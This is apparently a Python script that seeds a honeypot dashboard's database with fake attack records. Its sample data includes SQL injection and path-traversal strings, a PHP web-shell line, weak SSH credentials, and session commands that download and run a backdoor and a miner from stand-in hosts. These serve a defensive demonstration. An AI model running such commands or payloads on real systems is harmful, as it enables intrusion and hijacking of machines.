#!/usr/bin/env python3
"""
Seed database with sample attack data for demonstration purposes.

This script populates the database with realistic attack examples
so that the dashboard displays meaningful data immediately after deployment.
"""
import asyncio
import random
from datetime import datetime, timedelta, timezone
from uuid import uuid4

from sqlalchemy import select

from tenebrinet.core.database import AsyncSessionLocal, init_db
from tenebrinet.core.models import Attack, Credential, Session


# Sample data pools
ATTACKER_IPS = [
    "45.142.212.61",  # Russia
    "103.253.145.28",  # China
    "185.220.101.47",  # Germany
    "91.219.237.244",  # Netherlands
    "198.98.51.189",  # USA
    "159.65.142.76",  # Singapore
    "167.99.164.160",  # UK
    "134.209.24.42",  # India
    "178.128.91.119",  # France
    "206.189.156.69",  # Canada
]

COUNTRIES = ["RU", "CN", "DE", "NL", "US", "SG", "GB", "IN", "FR", "CA"]

SERVICES = ["ssh", "http", "ftp"]

THREAT_TYPES = [
    "credential_attack",
    "sql_injection",
    "port_scan",
    "command_injection",
    "path_traversal",
    "ddos_attempt",
]

SSH_USERNAMES = [
    "root",
    "admin",
    "user",
    "test",
    "ubuntu",
    "pi",
    "oracle",
    "postgres",
    "mysql",
    "ftpuser",
]

SSH_PASSWORDS = [
    "123456",
    "password",
    "admin",
    "root",
    "12345678",
    "qwerty",
    "abc123",
    "letmein",
    "welcome",
    "monkey",
]

HTTP_PAYLOADS = [
    "' OR 1=1 --",
    "admin' --",
    "UNION SELECT NULL--",
    "../../../etc/passwd",
    "<?php system($_GET['cmd']); ?>",
    "<script>alert('XSS')</script>",
    "; cat /etc/passwd",
    "../../../../windows/system32/config/sam",
]

FTP_COMMANDS = [
    "USER anonymous",
    "PASS guest@",
    "LIST",
    "RETR /etc/passwd",
    "STOR backdoor.php",
]


async def create_sample_attacks(num_attacks: int = 100) -> None:
    """
    Create sample attack records.

    Args:
        num_attacks: Number of attack records to create
    """
    async with AsyncSessionLocal() as session:
        print(f"Creating {num_attacks} sample attacks...")

        # Generate attacks over the past 7 days
        now = datetime.now(timezone.utc)
        start_time = now - timedelta(days=7)

        for i in range(num_attacks):
            # Random timestamp within the past week
            random_seconds = random.randint(0, 7 * 24 * 60 * 60)
            timestamp = start_time + timedelta(seconds=random_seconds)

            # Random attacker
            ip = random.choice(ATTACKER_IPS)
            country = random.choice(COUNTRIES)

            # Random service
            service = random.choice(SERVICES)

            # Random threat type with weighted distribution
            threat_type = random.choices(
                THREAT_TYPES,
                weights=[40, 20, 15, 10, 10, 5],  # More brute-force attacks
                k=1,
            )[0]

            # Confidence score (higher for common attack types)
            if threat_type in ["credential_attack", "sql_injection"]:
                confidence = random.uniform(0.85, 0.99)
            else:
                confidence = random.uniform(0.65, 0.90)

            # Create attack
            attack = Attack(
                id=uuid4(),
                timestamp=timestamp,
                ip=ip,
                port=random.choice([2222, 8080, 2121]),
                service=service,
                threat_type=threat_type,
                confidence=confidence,
                country=country,
                payload=generate_payload(service, threat_type),
                raw_data={"demo": True, "generated": True},
            )

            session.add(attack)

            # Add credentials for SSH attacks
            if service == "ssh" and threat_type == "credential_attack":
                num_attempts = random.randint(1, 5)
                for _ in range(num_attempts):
                    credential = Credential(
                        id=uuid4(),
                        attack_id=attack.id,
                        username=random.choice(SSH_USERNAMES),
                        password=random.choice(SSH_PASSWORDS),
                        timestamp=timestamp
                        + timedelta(seconds=random.randint(0, 60)),
                    )
                    session.add(credential)

            # Add session data for successful logins (10% chance)
            if service == "ssh" and random.random() < 0.1:
                session_obj = Session(
                    id=uuid4(),
                    attack_id=attack.id,
                    start_time=timestamp,
                    end_time=timestamp + timedelta(minutes=random.randint(1, 30)),
                    commands=generate_session_commands(),
                )
                session.add(session_obj)

            # Commit in batches
            if (i + 1) % 20 == 0:
                await session.commit()
                print(f"  Created {i + 1}/{num_attacks} attacks...")

        # Final commit
        await session.commit()
        print(f"✅ Successfully created {num_attacks} sample attacks!")


def generate_payload(service: str, threat_type: str) -> str:
    """Generate realistic payload based on service and threat type."""
    if service == "http":
        if threat_type == "sql_injection":
            return random.choice(HTTP_PAYLOADS[:4])
        elif threat_type == "command_injection":
            return random.choice(HTTP_PAYLOADS[4:6])
        elif threat_type == "path_traversal":
            return random.choice(HTTP_PAYLOADS[3:4] + HTTP_PAYLOADS[7:8])
        else:
            return random.choice(HTTP_PAYLOADS)
    elif service == "ftp":
        return random.choice(FTP_COMMANDS)
    elif service == "ssh":
        return f"SSH-2.0-OpenSSH_{random.choice(['7.4', '7.9', '8.0', '8.2'])}"
    return ""


def generate_session_commands() -> list:
    """Generate realistic SSH session commands."""
    command_pools = [
        ["whoami", "id", "uname -a"],
        ["ls -la", "pwd", "cat /etc/passwd"],
        ["ps aux", "netstat -tulpn", "ifconfig"],
        ["wget http://malicious.com/backdoor.sh", "chmod +x backdoor.sh"],
        ["curl -O http://evil.com/miner", "./miner"],
    ]
    return random.choice(command_pools)


async def check_existing_data() -> bool:
    """Check if database already has data."""
    async with AsyncSessionLocal() as session:
        result = await session.execute(select(Attack).limit(1))
        return result.scalar() is not None


async def main():
    """Main entry point."""
    print("🌱 TenebriNET Database Seeder")
    print("=" * 50)

    # Initialize database
    print("Initializing database...")
    await init_db()

    # Check for existing data
    has_data = await check_existing_data()
    if has_data:
        print("⚠️  Database already contains attack data.")
        response = input("Do you want to add more sample data? (y/N): ")
        if response.lower() != "y":
            print("Seeding cancelled.")
            return

    # Create sample data
    await create_sample_attacks(num_attacks=150)

    print("\n✨ Database seeding complete!")
    print("You can now access the dashboard at http://localhost:8000")


if __name__ == "__main__":
    asyncio.run(main())
